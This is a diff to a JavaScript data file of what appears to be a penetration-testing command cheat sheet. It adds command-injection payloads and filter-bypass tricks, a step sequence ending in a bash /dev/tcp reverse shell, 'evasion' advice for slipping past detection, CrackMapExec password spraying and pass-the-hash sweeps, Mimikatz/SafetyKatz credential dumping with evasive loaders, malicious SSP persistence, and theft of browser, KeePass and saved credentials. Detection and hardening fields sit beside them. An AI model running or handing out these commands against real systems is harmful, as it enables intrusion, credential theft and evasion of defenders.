+        "artifacts": "Access log: parameter values containing ${PATH:0:1}, ${IFS}, or Windows environment variable substring patterns.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -9233,7 +9824,9 @@ const COMMAND_DATA = {
         "why_it_works": "Blacklisted commands (whoami, cat, id) are detected by substring matching. Single/double quotes split within a command word are ignored by bash: w'h'o'am'i executes as whoami. Backslashes escape the following character (no effect in bash): w\\ho\\am\\i runs as whoami. Linux-only: who$@ami — $@ expands to empty string in non-array context, so the shell sees whoami. These all bypass string-matching command blacklists while the shell interprets the command correctly.",
         "impact": "Bypasses command-word blacklists — any blacklisted command (cat, whoami, id, ls, nc) can be obfuscated to execute while evading keyword filters.",
         "detection": "[MITRE T1059] WAF: quoted-character patterns in command context. Shell process audit: actual command executed (after shell interpretation) visible in process audit log regardless of obfuscation. avoid blacklists — allowlist valid inputs instead.",
-        "artifacts": "Access log: w'h'o'am'i or w\\ho\\am\\i patterns. Process audit: whoami executed by www-data (shell de-obfuscates before execution — audit log shows real command)."
+        "artifacts": "Access log: w'h'o'am'i or w\\ho\\am\\i patterns. Process audit: whoami executed by www-data (shell de-obfuscates before execution — audit log shows real command).",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -9355,8 +9948,34 @@ const COMMAND_DATA = {
         "why_it_works": "Shell metacharacters (;, &, |, \\n, ``, $()) are interpreted by the OS shell as command separators or substitution operators. When appended to a valid input (127.0.0.1; whoami), the shell executes both the original command and the injected command sequentially. The ; operator runs both regardless of success; && runs the second only if the first succeeds; || runs the second only if the first fails. Newline (%0a) is often a bypass when ; is filtered.",
         "impact": "OS command execution as the web server user — file reads (cat /etc/passwd), network enumeration, credential access, reverse shell establishment. On Windows with IIS running as SYSTEM: immediate privilege escalation to administrator.",
         "detection": "[MITRE T1059] WAF/IDS: shell metacharacters in HTTP parameters (;, &&, |, %0a, %26, $()). Application log: unusual output in response (command output instead of expected application output). Process audit: web server spawning shell processes (sh, bash, cmd.exe) as child processes.",
-        "artifacts": "Web access log: parameter values containing ;, &&, |, %0a, %26. Process list: child processes spawned by web server (e.g., /bin/sh spawned by php-fpm). Application log: command output appearing in response."
-      }
+        "artifacts": "Web access log: parameter values containing ;, &&, |, %0a, %26. Process list: child processes spawned by web server (e.g., /bin/sh spawned by php-fpm). Application log: command output appearing in response.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
+      },
+      "variations": [
+        {
+          "label": "Operators",
+          "command": "; whoami   |   && whoami   |   | whoami   |   `whoami`   |   $(whoami)"
+        },
+        {
+          "label": "Newline / time-based blind",
+          "command": "%0a whoami   |   ; ping -c 5 <attacker>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Inject a separator + command",
+          "command": "<input>; whoami"
+        },
+        {
+          "label": "If blind, confirm out-of-band",
+          "command": "<input>; ping -c 3 <attacker>   # watch tcpdump"
+        },
+        {
+          "label": "Escalate to a reverse shell",
+          "command": "<input>; bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'"
+        }
+      ]
     },
     {
       "type": "cheatsheet",
@@ -9530,10 +10149,6 @@ const COMMAND_DATA = {
       "command": "echo 'whoami' | rev        # get reversed string\n$(rev<<<'imaohw')",
       "variations": [
         {
-          "label": "Linux",
-          "command": "echo 'whoami' | rev        # get reversed string\n$(rev<<<'imaohw')"
-        },
-        {
           "label": "Windows PowerShell",
           "command": "\"whoami\"[-1..-20] -join ''\niex \"$('imaohw'[-1..-20] -join '')\""
         }
@@ -9559,7 +10174,9 @@ const COMMAND_DATA = {
         "why_it_works": "echo 'imaohw' | rev | bash reverses the string 'imaohw' to 'whoami' and executes it. $(rev<<<'imaohw') is the one-liner. Since the blacklisted command string 'whoami' never appears in the payload, substring matching fails. Windows PowerShell: 'whoami'[-1..-20] -join '' reverses the string; iex executes it. The reversal happens at runtime in the shell, bypassing static string analysis.",
         "impact": "Bypasses static string matching for any blacklisted command — executes arbitrary commands without the command keyword ever appearing in the HTTP request.",
         "detection": "[MITRE T1059] WAF: rev, iex, eval, base64 -d patterns in parameters — command execution meta-commands are indicators. Process audit: actual executed command visible after shell processes substitution. Allowlist validation prevents any of these reaching the shell.",
-        "artifacts": "Access log: $(rev<<<...) or rev<<<... or iex ($(...)) patterns. Process audit: actual reversed command executed."
+        "artifacts": "Access log: $(rev<<<...) or rev<<<... or iex ($(...)) patterns. Process audit: actual reversed command executed.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -9630,10 +10247,6 @@ const COMMAND_DATA = {
       "command": "127.0.0.1%0a%09whoami",
       "variations": [
         {
-          "label": "Tab (%09)",
-          "command": "127.0.0.1%0a%09whoami"
-        },
-        {
           "label": "IFS variable",
           "command": "127.0.0.1%0a${IFS}whoami"
         },
@@ -9663,7 +10276,9 @@ const COMMAND_DATA = {
         "why_it_works": "Some WAFs or input filters block the space character in parameters. Bash interprets several alternatives as whitespace: %09 (tab), ${IFS} (Internal Field Separator, defaults to space/tab/newline), brace expansion {cmd,-args} passes arguments without spaces. These bypass string-matching filters looking for ' ' (space) while the shell still parses the command correctly.",
         "impact": "Bypasses space-character filters to enable command injection — extends exploitation to applications that block spaces in parameters but don't block alternative whitespace characters.",
         "detection": "[MITRE T1059] WAF: ${IFS} pattern in parameters, %09 (tab) in parameter values where space is blocked, {cmd,-arg} brace expansion syntax. Normalise input before filter application — replace all whitespace variants before checking.",
-        "artifacts": "Access log: %09, ${IFS}, or {cmd,-la} patterns in parameter values. WAF log: whitespace bypass attempts."
+        "artifacts": "Access log: %09, ${IFS}, or {cmd,-la} patterns in parameter values. WAF log: whitespace bypass attempts.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -9953,7 +10568,7 @@ const COMMAND_DATA = {
     {
       "id": "bitlocker2john",
       "name": "Crack BitLocker Volume (bitlocker2john)",
-      "command": "bitlocker2john -i <file.vhd> > backup.hashes && grep 'bitlocker\\$0' backup.hashes > backup.hash",
+      "command": "bitlocker2john -i <vhd_file> > backup.hashes && grep 'bitlocker\\$0' backup.hashes > backup.hash",
       "description": "Extracts the BitLocker password hash from a VHD/volume image with bitlocker2john, keeps only the password hash line ($bitlocker$0), then cracks it with Hashcat mode 22100. Mount the unlocked volume afterward with dislocker.",
       "platform": "linux",
       "requires": [
@@ -10097,7 +10712,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "nxc --groups enumerates domain groups (including privileged ones) over SMB.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. CrackMapExec queries group membership over SMB/SAMR, which authenticated users may read.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "Group inventory revealing privileged targets.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10114,6 +10729,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec (successor)",
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --groups"
+        }
       ]
     },
     {
@@ -10175,7 +10796,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "CrackMapExec/NetExec enumerates domain users over SMB (--users) using valid creds or a null session.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. CME pulls the user list via SAMR/LDAP to build a target list for spraying and roasting.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "A domain user list gathered over SMB.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10192,6 +10813,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec",
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --users"
+        },
+        {
+          "label": "RID brute (null/guest)",
+          "command": "crackmapexec smb <dc_ip> -u guest -p '' --rid-brute"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate domain users",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> --users"
+        },
+        {
+          "label": "Save to a userlist for spraying/roasting",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> --users | awk '{print $5}' > users.txt"
+        }
       ]
     },
     {
@@ -10254,7 +10895,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "nxc --shares enumerates accessible SMB shares across hosts, revealing readable/writable data stores.",
+        "why_it_works": "Share and file ACLs are enumerable by authenticated users; CME lists which shares your account can read/write to find data and staging locations.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "A map of accessible shares to pillage.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10271,6 +10912,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec + filter readable",
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --shares"
+        }
       ]
     },
     {
@@ -10350,6 +10997,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "Search SYSVOL for cpassword",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> -M gpp_password"
+        },
+        {
+          "label": "PowerView Get-GPPAutologon",
+          "command": "Get-GPPAutologon"
+        }
       ]
     },
     {
@@ -10412,7 +11069,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "nxc --loggedon-users lists users logged onto remote hosts, exposing where privileged sessions live (for targeting).",
+        "why_it_works": "The Windows service enumerating logged-on users (via SAMR/remote registry) returns sessions to any authenticated caller with access, revealing where privileged users are active for token/TGT theft.",
         "prerequisites": "Local-admin credentials and SMB access to the hosts.",
         "impact": "Where privileged users are logged in - targets for token theft/PtH.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10429,6 +11086,20 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec",
+          "command": "nxc smb <target> -u <user> -p <password> --loggedon-users"
+        },
+        {
+          "label": "qwinsta - native session enum (from a foothold)",
+          "command": "qwinsta /server:<target>"
+        },
+        {
+          "label": "query user / quser - who is logged on",
+          "command": "query user /server:<target>"
+        }
       ]
     },
     {
@@ -10491,7 +11162,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "nxc --pass-pol reads the domain password policy over SMB to plan safe spraying.",
+        "why_it_works": "The domain password policy is stored in readable domain attributes (and exposed via SAMR), so any account — sometimes even a null session — can retrieve lockout threshold and length before spraying.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "Lockout/complexity policy for safe spraying.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10508,6 +11179,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec",
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --pass-pol"
+        },
+        {
+          "label": "Null session",
+          "command": "crackmapexec smb <dc_ip> -u '' -p '' --pass-pol"
+        }
       ]
     },
     {
@@ -10595,6 +11276,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec local-auth PtH sweep",
+          "command": "nxc smb <cidr> --local-auth -u administrator -H <nt_hash>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Spray a local admin hash across the subnet",
+          "command": "crackmapexec smb --local-auth <cidr> -u administrator -H <nt_hash> | grep +"
+        },
+        {
+          "label": "Pwn3d! hosts = local admin -> dump creds",
+          "command": "crackmapexec smb <host> --local-auth -u administrator -H <nt_hash> --sam"
+        }
       ]
     },
     {
@@ -10673,7 +11370,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "CrackMapExec/NetExec sprays one password across many domain accounts over SMB, validating credentials at scale.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. CME tries one password across many users (spray) to stay under per-account lockout.",
         "prerequisites": "A domain user list, candidate password(s), and network access to the auth service.",
         "impact": "Compromised accounts using the sprayed password - a domain foothold.",
         "detection": "Failed-authentication bursts: Windows 4625 / Kerberos 4771; account lockouts (4740). Spraying = one password across MANY accounts (few failures each - a subtle, distributed pattern). Defender for Identity flags spraying.",
@@ -10690,6 +11387,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec + continue on success",
+          "command": "nxc smb <dc_ip> -u <userlist> -p <password> --continue-on-success | grep +"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Check the lockout policy FIRST",
+          "command": "crackmapexec smb <dc_ip> -u '' -p '' --pass-pol"
+        },
+        {
+          "label": "Spray one password across all users",
+          "command": "crackmapexec smb <dc_ip> -u <userlist> -p '<Season2024>' | grep +"
+        }
       ]
     },
     {
@@ -10753,7 +11466,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "nxc spider_plus crawls readable shares for files likely to hold credentials/secrets.",
+        "why_it_works": "Because readable shares are browsable, CME recursively walks them for files containing secrets (configs, scripts, credentials) that developers left world-readable.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "Secret-bearing files discovered across shares.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -10771,6 +11484,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec spider_plus",
+          "command": "nxc smb <dc_ip> -u <user> -p <password> -M spider_plus -o READ_ONLY=false"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Spider all readable shares for secrets",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> -M spider_plus -o READ_ONLY=true"
+        },
+        {
+          "label": "Review the JSON output",
+          "command": "cat /tmp/cme_spider_plus/<ip>.json | jq"
+        }
       ]
     },
     {
@@ -10855,6 +11584,21 @@ const COMMAND_DATA = {
           "id": "crtp-psremoting",
           "note": "Run remotely via PS Remoting",
           "rel": "prereq"
+        },
+        {
+          "id": "crtp-loader",
+          "note": "Run SafetyKatz in-memory with evasive verbs",
+          "rel": "alternative"
+        },
+        {
+          "id": "crtp-lsass-minidump",
+          "note": "Dump LSASS and parse offline to keep Mimikatz off the host",
+          "rel": "alternative"
+        },
+        {
+          "id": "crtp-evasive-mimikatz",
+          "note": "Full evasive verb reference for the exam",
+          "rel": "alternative"
         }
       ],
       "notes": "SafetyKatz uses minidump approach — less Credential Guard triggering than direct LSASS access. Requires SYSTEM or local admin.",
@@ -10886,7 +11630,29 @@ const COMMAND_DATA = {
         "misconfiguration": "RunAsPPL not enabled. Credential Guard not deployed. WDigest enabled (UseLogonCredential = 1) — stores cleartext passwords. No EDR monitoring LSASS access.",
         "vulnerable_config": "# RunAsPPL disabled (default on older Windows):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RunAsPPL\n# Returns $null or 0 = PPL NOT enabled = LSASS memory readable\n\n# WDigest enabled (plaintext creds in memory):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest').UseLogonCredential\n# Returns 1 = plaintext passwords cached in LSASS",
         "secure_config": "# Enable LSA Protection (PPL):\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1\n# Registry entry also requires: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPLBoot = 1 (Secure Boot)\n\n# Disable WDigest:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -Value 0\n# Via GPO: Computer Config → Admin Templates → MS Security Guide → WDigest: Disabled\n\n# Enable Credential Guard (Windows 10/Server 2016+):\n# Computer Config → Admin Templates → System → Device Guard\n# → Turn On Virtualization Based Security: Enabled\n# → Credential Guard Configuration: Enabled with UEFI lock\n\n# Sysmon Rule — alert on LSASS access:\n# <ProcessAccess onmatch='include'><TargetImage condition='is'>C:\\Windows\\system32\\lsass.exe</TargetImage></ProcessAccess>"
-      }
+      },
+      "variations": [
+        {
+          "label": "Kerberos AES keys (for overpass-the-hash)",
+          "command": "SafetyKatz.exe \"sekurlsa::ekeys\" \"exit\""
+        },
+        {
+          "label": "Evasive keys via Loader (in-memory)",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-keys\" \"exit\""
+        },
+        {
+          "label": "Local SAM hashes",
+          "command": "SafetyKatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\""
+        },
+        {
+          "label": "DPAPI vault / Credential Manager creds",
+          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'"
+        },
+        {
+          "label": "Register malicious SSP (plaintext capture persistence)",
+          "command": "Invoke-Mimikatz -Command '\"misc::memssp\"'   # logons -> C:\\Windows\\System32\\mimilsa.log"
+        }
+      ]
     },
     {
       "type": "command",
@@ -10971,8 +11737,15 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1555.003"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Cookies too",
+          "command": ".\\SharpChrome.exe cookies /unprotect"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11146,7 +11919,7 @@ const COMMAND_DATA = {
       ],
       "id": "keepass2john-crack",
       "name": "Credential Hunting - Crack KeePass Database",
-      "command": "keepass2john <db>.kdbx > keepass.hash && hashcat -m 13400 keepass.hash rockyou.txt",
+      "command": "keepass2john <kdbx_file> > keepass.hash && hashcat -m 13400 keepass.hash rockyou.txt",
       "description": "Extract a crackable hash from a found .kdbx KeePass database and brute-force the master password offline with hashcat mode 13400.",
       "opsec": "loud",
       "mitre": [
@@ -11167,8 +11940,29 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1555",
           "MITRE T1110.002"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "hashcat mode 13400",
+          "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find the .kdbx",
+          "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
+        },
+        {
+          "label": "Extract the hash",
+          "command": "keepass2john <kdbx_file> > keepass.hash"
+        },
+        {
+          "label": "Crack it",
+          "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11231,7 +12025,7 @@ const COMMAND_DATA = {
       ],
       "id": "powershell-clixml-decrypt",
       "name": "Credential Hunting - Decrypt Export-Clixml Secrets",
-      "command": "$c = Import-Clixml -Path '<pass.xml>'; $c.GetNetworkCredential().Password",
+      "command": "$c = Import-Clixml -Path '<cred_xml>'; $c.GetNetworkCredential().Password",
       "description": "PSCredential objects saved with Export-Clixml are DPAPI-encrypted to the saving user. Running as that user, import the file and read the plaintext username/password.",
       "opsec": "loud",
       "mitre": [
@@ -11252,8 +12046,25 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1555"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "One-liner",
+          "command": "(Import-Clixml '<cred_xml>').GetNetworkCredential().Password"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find exported credential XML",
+          "command": "Get-ChildItem -Path C:\\ -Include *.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'System.Management.Automation.PSCredential'"
+        },
+        {
+          "label": "Decrypt it (only as the same user/host that saved it)",
+          "command": "$c = Import-Clixml '<cred_xml>'; $c.GetNetworkCredential().Password"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11338,8 +12149,19 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1555.003",
           "MITRE T1555"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Only browsers",
+          "command": ".\\lazagne.exe browsers"
+        },
+        {
+          "label": "Write to file",
+          "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11428,8 +12250,15 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1083"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "All users' history",
+          "command": "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | gc"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11499,10 +12328,6 @@ const COMMAND_DATA = {
       "description": "Common secret stashes: Winlogon AutoLogon (DefaultPassword), PuTTY saved sessions (proxy creds), and saved wireless profiles (recoverable in cleartext).",
       "variations": [
         {
-          "label": "AutoLogon",
-          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
-        },
-        {
           "label": "PuTTY sessions",
           "command": "reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions"
         },
@@ -11530,7 +12355,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.002",
           "MITRE T1078"
-        ]
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
       }
     },
     {
@@ -11629,8 +12455,19 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1083"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Recursive across the drive",
+          "command": "findstr /S /I /M /C:\"password\" C:\\*.txt C:\\*.ini C:\\*.config C:\\*.xml"
+        },
+        {
+          "label": "Registry passwords",
+          "command": "reg query HKLM /f password /t REG_SZ /s"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11716,8 +12553,19 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1555"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "All hosts in the domain",
+          "command": "Invoke-SessionGopher -AllDomain -o"
+        },
+        {
+          "label": "Thorough (search filesystem too)",
+          "command": "Invoke-SessionGopher -Thorough"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11808,8 +12656,16 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552",
           "MITRE T1083"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input.",
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Locate the DB first",
+          "command": "gci C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11895,8 +12751,25 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1078"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Reuse the saved credential",
+          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\""
+        }
+      ],
+      "steps": [
+        {
+          "label": "List saved credentials",
+          "command": "cmdkey /list"
+        },
+        {
